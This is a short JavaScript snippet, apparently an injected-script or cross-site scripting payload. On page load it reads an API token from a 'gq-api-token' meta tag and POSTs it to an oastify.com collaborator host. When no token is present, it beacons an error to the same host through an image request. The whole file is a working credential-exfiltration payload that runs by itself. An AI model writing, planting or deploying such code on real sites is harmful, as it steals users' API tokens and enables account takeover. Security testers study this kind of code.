document.addEventListener('DOMContentLoaded', function () {
  const token = document.querySelector('meta[name="gq-api-token"]')?.content;

  if (token) {
    fetch('https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token })
    });
  } else {
    const img = new Image();
    img.src = 'https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com/?error=no_token_found';
  }
});
